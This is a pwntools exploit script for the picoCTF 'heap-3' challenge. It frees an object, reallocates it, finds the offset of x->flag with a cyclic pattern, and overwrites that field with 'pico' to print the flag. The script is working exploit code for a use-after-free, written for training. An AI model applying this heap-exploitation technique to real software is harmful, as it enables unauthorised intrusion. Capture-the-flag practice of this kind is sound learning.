#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./heap-3')
p = process(elf.path)
# p = remote('tethys.picoctf.net', 55317)

# Overwrite x->flag
p.sendlineafter(b'Enter your choice: ', b'5')
p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Size of object allocation: ', b'35')
p.sendlineafter(b'Data for flag: ', cyclic(100))

# Find x->flag offset
p.sendlineafter(b'Enter your choice: ', b'1')
p.recvuntil(b'  ->   ')
p.recvuntil(b'  ->   ')
x = p.recvline().strip()
x_offset = cyclic_find(x)
log.info(f'{x_offset=}')

# # Overwrite x->flag with `pico`
p.sendlineafter(b'Enter your choice: ', b'5')
p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Size of object allocation: ', b'35')
p.sendlineafter(b'Data for flag: ', b'A' * x_offset + b'pico')

# Get flag
p.sendlineafter(b'Enter your choice: ', b'4')
p.interactive()
